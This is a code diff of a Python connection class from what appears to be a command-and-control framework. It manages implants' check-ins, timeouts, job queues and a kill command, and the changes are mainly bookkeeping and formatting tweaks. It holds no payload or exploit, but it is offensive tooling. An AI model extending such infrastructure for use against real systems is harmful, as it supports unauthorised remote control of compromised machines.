@@ -8,22 +8,22 @@ class Connection():
 
     Job = namedtuple('Job', ['type', 'data'])
 
-    def __init__(self, stager):
+    def __init__(self, connection_id, stager):
         self.job_queue = []
         self.connection_cli = None
+        self.connection_id = connection_id
         self.file_queue = []
         self.stager = stager
         self.stager_requested = time.time()
         self.last_checkin = time.time()
-        self.loaded_functions = []
+        self.loaded_functions = ['kill']
         self.menu_options = {}
         self.status = 'pending'
         self.system_information = {}
 
     def __str__(self):
         internet_addr = self.system_information['ip']
-        #return f'A {self.stager.format} implant, {internet_addr}, is {self.status} and last checked in at {self.get_current_time(self.last_checkin)}.'
-        return '{:<10} {:<15} {:<13} {:<10}'.format(self.stager.format, internet_addr, self.status, self.get_current_time(self.last_checkin))
+        return '{:<13} {:<18} {:<13} {:<16} {:<13}'.format(self.connection_id, internet_addr, self.stager.format,  self.status, self.get_current_time(self.last_checkin))
 
     def check_in(self):
         ip = self.system_information['ip']
@@ -34,7 +34,7 @@ class Connection():
         return 0, 'Success'
 
     def disconnected(self):
-        if time.time() - self.last_checkin >= 60:
+        if time.time() - self.last_checkin >= (60*30):
             self.status = 'disconnected'
             return True
         return False
@@ -47,8 +47,8 @@ class Connection():
         return 0, 'Success'
 
     def execute(self, option):
-        function = self.stager.functions[option[0]]
-        if function.name not in self.loaded_functions:
+        if option[0] not in self.loaded_functions:
+            function = self.stager.functions[option[0]]
             self.load_function(function)
         self.job_queue.append(self.Job('command', option))
         return 0, 'Success'
@@ -63,7 +63,7 @@ class Connection():
     def interact(self):
         self.menu_options['discover'] = util.MenuOption(self.discover_functions, 'Discovers new options from provided files within the extensions directory (e.g., discover stdlib.jscript).', 'Connection Options', color.normal, True)
         self.menu_options['information'] = util.MenuOption(self.information, 'Displays gathered system information.', 'Connection Options', color.normal, False)
-        self.menu_options['kill'] = util.MenuOption(self.execute, 'Kills the current connection.', 'Connection Options', color.normal, False)
+        self.menu_options['kill'] = util.MenuOption(self.execute, 'Kills the current connection.', 'Connection Options', color.normal, True)
         internet_addr = self.system_information['ip']
         self.connection_cli = cli.CommandLine(f'connection ({internet_addr}) :')
         self.update_options()
@@ -82,7 +82,7 @@ class Connection():
             self.load_function(function)
 
     def stale(self):
-        if time.time() - self.last_checkin >= 10:
+        if time.time() - self.last_checkin >= 60:
             self.status = 'stale'
             return True
         return False
